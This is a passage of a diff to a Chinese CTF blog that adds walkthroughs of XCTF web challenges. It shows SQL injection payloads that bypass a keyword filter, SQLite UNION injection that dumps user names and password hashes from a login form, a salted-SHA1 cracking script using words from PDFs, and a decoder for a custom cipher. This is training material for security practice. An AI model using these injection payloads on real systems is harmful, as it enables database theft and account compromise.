 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112602976187180</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 114784820031327</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),25,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 112615676665705</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),37,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 126853610566245</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),49,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 48848364724837</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(table_name) frfromom information_schema.tables where table_schema=database())),61,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 29299</span><br></pre></td></tr></table></figure>
 <p>转换为 ASCII</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = [112602976187180,114784820031327,112615676665705,126853610566245,48848364724837,29299]</span><br><span class="line"></span><br><span class="line">for i in range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[2:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">	for j in range(0,len(i),2):</span><br><span class="line">		hex_list.append(i[j:j+2])</span><br><span class="line"></span><br><span class="line">for i in hex_list:</span><br><span class="line">	con_list.append(int(i,16))</span><br><span class="line"></span><br><span class="line">for i in con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(flag)		#输出 files,hello_flag_is_here,members</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">112602976187180</span>,<span class="number">114784820031327</span>,<span class="number">112615676665705</span>,<span class="number">126853610566245</span>,<span class="number">48848364724837</span>,<span class="number">29299</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">	s[i] = hex(s[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">hex_list = []</span><br><span class="line">con_list = []</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,len(i),<span class="number">2</span>):</span><br><span class="line">		hex_list.append(i[j:j+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> hex_list:</span><br><span class="line">	con_list.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> con_list:</span><br><span class="line">	flag = flag + chr(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s)</span><br><span class="line">print(flag)		<span class="comment">#输出 files,hello_flag_is_here,members</span></span><br></pre></td></tr></table></figure>
 <p><strong>注列名</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),1,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 115858377367398</span><br><span class="line"></span><br><span class="line">s&apos;+(selselectect CONV(substr(hex((selselectect group_concat(column_name) frfromom information_schema.columns where table_name=&apos;hello_flag_is_here&apos;)),13,12),16,10))+&apos;.jpg</span><br><span class="line">#返回 7102823</span><br></pre></td></tr></table></figure>
 <p>使用如上代码，转换为 ASCII 结果为 <code>i_am_flag</code></p>
@@ -1057,7 +1168,79 @@
 <p>转换为 ASCII 结果</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png" alt="7-11"></p>
 <p>拿到flag，直接提交不用加外套</p>
-<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2>
+<h2 id="FlatScience"><a href="#FlatScience" class="headerlink" title="FlatScience"></a>FlatScience</h2><p>进站日常扫描</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-1.png" alt="8-1"></p>
+<p>访问<code>robots.txt</code>，里面的内容也还是我们扫出来的<code>admin.php</code>、<code>login.php</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-2.png" alt="8-2"></p>
+<p>先查看<code>login.php</code>，用户名提交单引号会出现<code>sql报错</code>，但是没有找到突破点。但是在源码中看到<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-3.png" alt="8-3"></p>
+<p>提交<code>debug</code>参数，得到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE HTML <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD HTML 4.01//EN"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">blockquote &#123; background: <span class="comment">#eeeeee; &#125;</span></span><br><span class="line">h1 &#123; border-bottom: solid black <span class="number">2</span>px; &#125;</span><br><span class="line">h2 &#123; border-bottom: solid black <span class="number">1</span>px; &#125;</span><br><span class="line">.comment &#123; color: darkgreen; &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=iso-8859-1"</span>&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div align=right <span class="class"><span class="keyword">class</span>=<span class="title">lastmod</span>&gt;</span></span><br><span class="line">Last Modified: Fri Mar  31:33:7 UTC 1337</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Login&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">Login Page, <span class="keyword">do</span> not <span class="keyword">try</span> to hax here plox!&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form method=<span class="string">"post"</span>&gt;</span><br><span class="line">  ID:&lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"usr"</span>&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  Password:&lt;br&gt; </span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"pw"</span>&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</span><br></pre></td></tr></table></figure>
+<p>从源码中可以看到：①使用了<code>SQLite3</code>，他是一款轻型的数据库，处理速度比 Mysql、POstfreSQL 都快；②当查询的语句返回结果有值的话，将会调用<code>setcookie()</code>函数</p>
+<p>对于 SQLite3 有一点需要知道：它自带的结构表为<code>sqlite_master</code>，<code>sql</code>是其中的一个字段，<code>可以返回创建表的语句</code>，注入的时候经常会用到，首先先搞清楚列数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select 1 --+&amp;pw=123	#报错do not have the same number of result columns</span><br><span class="line"></span><br><span class="line">usr=&apos; union select 1,2 --+&amp;pw=123	#无报错</span><br><span class="line"></span><br><span class="line">usr=&apos; union select 1,2,3 --+&amp;pw=123	#报错do not have the same number of result columns</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-5.png" alt="8-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-6.png" alt="8-6"></p>
+<p>确认字段数为<code>2</code>，并且注入点在<code>2</code>，回显的点在 Set-Cookie 中的<code>name</code>字段，构造 payload 利用 sqlite_master 的 sql 字段可以返回创建表的语句这一功能，查看目标表的字段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select name,sql from sqlite_master --+&amp;pw=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-4.png" alt="8-4"></p>
+<p>可以看到，服务器返回<code>Set-Cookie</code>字段了，将其解码得到如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(<span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,<span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),hint <span class="built_in">varchar</span>(<span class="number">255</span>))</span><br></pre></td></tr></table></figure>
+<p>知道表的列名之后，注出每个字段的数据</p>
+<p><strong>id</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select name,group_concat(id) from Users --+&amp;pw=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-7.png" alt="8-7"></p>
+<p><strong>name</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select name,group_concat(name) from Users --+&amp;pw=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-8.png" alt="8-8"></p>
+<p><strong>password</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select name,group_concat(password) from Users --+&amp;pw=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-9.png" alt="8-9"></p>
+<p><strong>hint</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usr=&apos; union select name,group_concat(hit) from Users --+&amp;pw=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/8-10.png" alt="8-10"></p>
+<p>整理</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>name</th>
+<th>password</th>
+<th>hint</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+<td>3fab54a50e770d830c0416df817567662a9dc85c</td>
+<td>my fav word in my fav paper?!</td>
+</tr>
+<tr>
+<td>2</td>
+<td>fritze</td>
+<td>54eae8935c90f467427f05e4ece82cf569f89507</td>
+<td>my love isâ¦?</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Chansi</td>
+<td>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</td>
+<td>the password is password</td>
+</tr>
+</tbody>
+</table>
+<p>根据 admin 的 hint ，之前翻网站翻到的 PDF 可能对破解密码有用。用网上的脚本，爬取总共30个 PDF 文件， 然后用脚本进行解析处理，并用sha1函数与加密的密码进行碰撞已找出正确的密码 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">	pdf_path = get_pdf()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">		pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line">		<span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">			sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line">			<span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">				exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	find_password()</span><br></pre></td></tr></table></figure>
+<p>跑出密码：<code>ThinJerboa</code></p>
+<p>到 admin.php  登录，拿下flag</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>题目进去就可以看到代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>直接写对应解密代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line">$before_return = base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line">$_ = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($before_return);$_0++)&#123;</span><br><span class="line">    $_c = substr($before_return,$_0,<span class="number">1</span>);</span><br><span class="line">    $__ = ord($_c)<span class="number">-1</span>;</span><br><span class="line">    $_c = chr($__);</span><br><span class="line">    $_ = $_.$_c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/9-1.png" alt="9-1"></p>
+
       
 
       
@@ -1080,149 +1263,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Linux系统下搭建Web服务器和FTP服务器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/">Linux系统下搭建Web服务器和FTP服务器</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/09/03/Linux系统下搭建Web服务器和FTP服务器/" class="archive-article-date">
-  	<time datetime="2019-09-02T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-03</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web服务器安装与配置"><a href="#Web服务器安装与配置" class="headerlink" title="Web服务器安装与配置"></a>Web服务器安装与配置</h1><h2 id="Apache2和php组件的安装"><a href="#Apache2和php组件的安装" class="headerlink" title="Apache2和php组件的安装"></a>Apache2和php组件的安装</h2><p>使用如下命令来安装Apache2和php的组件</p>
-<p>Ps：如果只安装Apache2，将会导致写的php文件无法被解析</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br><span class="line">apt-get install php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-1.png" alt="1-1"></p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">状态：/etc/init.d/apache2 status（service apache2 status）</span><br><span class="line">开启：/etc/init.d/apache2 start（service apache2 start）</span><br><span class="line">关闭：/etc/init.d/apache2 stop（service apache2 stop）</span><br><span class="line">重启：/etc/init.d/apache2 restart（service apache2 restart）</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-2.png" alt="1-2"></p>
-<h2 id="网站根目录"><a href="#网站根目录" class="headerlink" title="网站根目录"></a>网站根目录</h2><p>网站根目录位于：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
-<p>创建文件时，一些文件记得修改文件对应的权限，才能访问</p>
-<h2 id="登录验证"><a href="#登录验证" class="headerlink" title="登录验证"></a>登录验证</h2><p>Apache2带有登录验证的功能，（1） 在<code>/etc</code>目录下创建<code>.Webpasswd</code>文件，设置登陆使用的用户名和密码。该文件为验证使用的储存用户名密码的文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Linux%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8CFTP%E6%9C%8D%E5%8A%A1%E5%99%A8/1-3.png" alt="1-3"></p>
